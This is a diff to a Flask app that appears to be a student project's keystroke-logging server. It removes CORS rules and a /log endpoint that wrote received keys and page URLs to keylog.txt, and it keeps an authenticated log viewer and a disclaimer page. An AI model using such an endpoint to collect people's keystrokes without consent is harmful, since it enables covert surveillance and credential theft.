@@ -1,26 +1,12 @@
 # app.py
 from flask import Flask, render_template, jsonify, session, request
-from flask_cors import CORS
 import os
 import logging
 from datetime import datetime
 from functools import wraps
 
 app = Flask(__name__)
-app.secret_key = os.urandom(24)
-
-# Enable CORS to allow requests from your Vercel domain
-CORS(app, resources={
-    r"/*": {
-        "origins": [
-            "https://www.finalyrproject.digital",
-            "https://*.vercel.app",
-            "http://localhost:3000"
-        ],
-        "methods": ["GET", "POST", "OPTIONS"],
-        "allow_headers": ["Content-Type"]
-    }
-})
+app.secret_key = os.urandom(24)  # Secure secret key for sessions
 
 # Configure logging
 logging.basicConfig(
@@ -29,6 +15,7 @@ logging.basicConfig(
     format='%(asctime)s - %(levelname)s - %(message)s'
 )
 
+# Get the absolute path of the directory this file is in
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 LOG_FILE = os.path.join(BASE_DIR, "keylog.txt")
 
@@ -63,32 +50,6 @@ def disclaimer():
         logging.info("Disclaimer accepted")
         return jsonify({'success': True})
     return render_template("disclaimer.html")
-
-@app.route('/log', methods=['POST', 'OPTIONS'])
-def log_keystroke():
-    if request.method == 'OPTIONS':
-        return jsonify({'success': True}), 200
-    
-    try:
-        data = request.json
-        if not data:
-            return jsonify({'success': False, 'error': 'No data received'}), 400
-        
-        key = data.get('key', 'Unknown')
-        timestamp = data.get('timestamp', datetime.now().isoformat())
-        url = data.get('url', 'Unknown')
-        
-        log_entry = f"[{timestamp}] Key: {key} | URL: {url}\n"
-        
-        with open(LOG_FILE, "a", encoding="utf-8") as f:
-            f.write(log_entry)
-        
-        logging.info(f"Keystroke logged: {key} from {url}")
-        return jsonify({'success': True}), 200
-        
-    except Exception as e:
-        logging.error(f"Error logging keystroke: {str(e)}")
-        return jsonify({'success': False, 'error': str(e)}), 500
 
 @app.route('/logs', methods=['GET'])
 @require_auth
@@ -129,4 +90,4 @@ def internal_error(error):
     return render_template('500.html'), 500
 
 if __name__ == '__main__':
-    app.run(debug=False, port=5000)
+    app.run(debug=False, port=5000)  # Set debug=False for production
